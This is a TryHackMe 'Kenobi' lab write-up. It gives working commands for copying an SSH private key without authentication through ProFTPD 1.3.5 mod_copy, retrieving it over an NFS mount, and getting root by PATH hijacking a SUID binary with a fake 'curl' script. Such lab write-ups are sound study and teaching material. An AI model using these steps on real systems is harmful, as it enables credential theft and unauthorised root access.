# Kenobi - TryHackMe

Linux machine running Samba, ProFTPD, NFS and SSH. The path runs through an anonymous SMB
share holding a log that reveals a username, the path of an SSH private key and the FTP
port, ProFTPD 1.3.5's `mod_copy` module copying that key without authentication into a
directory exported over NFS, SSH access as `kenobi`, and privilege escalation through PATH
hijacking on a custom SUID binary.

The machine expired during the first attempt and the room was redone from scratch - the
commands below use the IP from the second run.

---

## Reconnaissance

```bash
nmap -sV -sC -oN scan.txt 10.67.167.174
```

| Service | Port | Notes |
|---|---|---|
| SSH (OpenSSH 8.2p1) | 22 | Final access with kenobi's key |
| HTTP (Apache 2.4.41) | 80 | `robots.txt` lists `/admin.html`, not used in the chain |
| rpcbind / NFS | 111, 2049 | NFS service |
| Samba smbd 4.6.2 | 139, 445 | SMB shares |

Port 21 does not show up in the scan. The FTP service comes up later from the files found on
the SMB share.

---

## Enumeration

### SMB

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.67.167.174
```

The NSE scripts return nothing on this Samba version, so the shares are listed with
smbclient using a null session:

```bash
smbclient -L 10.67.167.174 -N
```

Three shares: `print$`, `anonymous` and `IPC$`. The `anonymous` share is readable without
credentials and contains `log.txt`:

```bash
smbclient //10.67.167.174/anonymous
smb: \> get log.txt
```

### log.txt

The log contains three pieces of configuration:

- the output of `ssh-keygen` for the user `kenobi`, with the key saved in
  `/home/kenobi/.ssh/id_rsa`
- a `proftpd.conf` with `Port 21` and `User kenobi`, so the FTP service runs as kenobi
- the `smb.conf` entry mapping the `anonymous` share to `/home/kenobi/share`

### NFS

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.67.167.174
```

The server exports `/var` to everyone (`/var *`).

### ProFTPD

Connecting to port 21 returns a `ProFTPD 1.3.5` banner:

```bash
nc 10.67.167.174 21
```

```bash
searchsploit ProFTPD 1.3.5
```

Four results, all for the `mod_copy` module (CVE-2015-3306), one of them the Metasploit
module `37262.rb`.

---

## Exploitation

### Copying the key with mod_copy

`mod_copy` exposes the `SITE CPFR` and `SITE CPTO` commands, which copy files on the server
without authentication and with the permissions of the user running the service - here
`kenobi`. The destination is inside `/var`, because that directory is exported over NFS and
can be read from the attacker machine. The exploit is run by hand with netcat, without
Metasploit:

```bash
nc 10.67.167.174 21
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### Retrieving the key over NFS

```bash
mount 10.67.167.174:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

### SSH as kenobi

```bash
ssh -i id_rsa kenobi@10.67.167.174
```

Shell as `kenobi`, and the user flag in `/home/kenobi/user.txt`.

---

## Privilege Escalation

### SUID enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

All results are standard system binaries except `/usr/bin/menu`.

### Binary analysis

```bash
strings /usr/bin/menu
```

The binary offers three options that run `curl -I localhost`, `uname -r` and `ifconfig`, all
called without an absolute path. Among the imported functions are `setuid` and `system`.

### PATH hijacking

`menu` is owned by root with the SUID bit set, calls `setuid(0)` and then passes
`curl -I localhost` to `system()`, which hands the line to `/bin/sh`. The shell looks up
`curl` in the directories listed in `$PATH`, in order, and `$PATH` is inherited from the
user. Placing a fake `curl` in `/tmp` and putting `/tmp` first in `$PATH` makes the binary
run it as root:

```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

Choosing option 1 opens a shell.

`id` shows `uid=0(root) gid=1000(kenobi)`.

The fake `curl` is a text file containing `/bin/sh`, not a copy of the shell binary. Without
a shebang it is executed as a shell script, which launches `/bin/sh`. Because the binary
calls `setuid(0)`, the real uid is also 0 and the shell keeps root privileges. The group
stays `1000` because the binary calls `setuid` but not `setgid`.

The root flag is in `/root/root.txt`.

---

## Key Takeaways

- The FTP port, the user running ProFTPD and the location of kenobi's private key all came
  from `log.txt` on the anonymous SMB share, not from the port scan.
- `mod_copy` alone only copies files inside the server. It becomes useful here because
  `/var` is exported over NFS, giving a location readable from outside.
- `strings` on the custom SUID binary showed both commands called without an absolute path
  and the `setuid` call that keeps the spawned shell as root.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were
performed strictly for educational purposes.
